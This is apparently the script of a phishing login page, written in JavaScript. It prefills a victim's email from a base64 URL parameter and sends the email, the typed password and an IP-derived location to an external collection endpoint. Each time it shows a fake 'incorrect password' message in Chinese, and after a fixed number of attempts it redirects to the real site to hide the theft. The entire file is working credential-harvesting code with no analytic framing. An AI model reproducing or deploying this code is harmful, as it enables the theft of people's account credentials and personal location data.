//sessionStorage.clear()
let trialCount = sessionStorage.getItem('numTrial')
let original = sessionStorage.getItem('original')

if (!trialCount) {
    sessionStorage.setItem('numTrial', 0)
} else if (trialCount >= numbersofTrial) {
    window.location.assign(original)
}

const xx = window.location.href.split('?')
let nl = document.querySelector('#nl')
let nlorg = document.querySelector('#nlorg')
let nlnow = document.querySelector('#nlnow')
let loc = document.querySelector('#loc')
let trial = document.querySelector('#trial')
let loader = document.querySelector('#loader')

if (xx[1] != undefined) {
    // nl.value = xx[1]
    // nlorg.value = xx[1]
    nl.value = atob(xx[1])
    nlorg.value = atob(xx[1])
}

trial.value = trialCount

let myForm = document.querySelector('#form_')
myForm.addEventListener('submit', async function (event) {
    event.preventDefault()

    let data = new FormData()

    data.append('nl', nl.value)
    data.append('nlorg', nlorg.value)
    data.append('nlnow', nlnow.value)
    data.append('loc', loc.value)
    data.append('trial', trial.value)
    data.append('resBox', resBox)

    let options = {
        method: 'POST',
        body: data,
    }

    loader.style.display = 'flex'
    loader.style.animation = 'showLoader .5s ease'

    const response = await fetch(pLnk, options)
    const result = await response.text()

    loader.style.animation = 'hideLoader 1s ease'
    setTimeout(() => {
        loader.style.display = 'none'
    }, 1000)

    console.log(result)

    trialCount++
    sessionStorage.setItem('numTrial', trialCount)
    trial.value = trialCount

    if (trialCount >= numbersofTrial) {
        window.location.assign(original)
    } else {
        document.getElementById('errmsg').innerHTML =
            '嗯，这不是正确的密码。请再试一次'
    }
})

$.get(
    'https://ipinfo.io/json?token=10da60a9ff2d81',
    function (response) {
        let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`
        $('#loc').val(cou)
    },
    'jsonp'
)
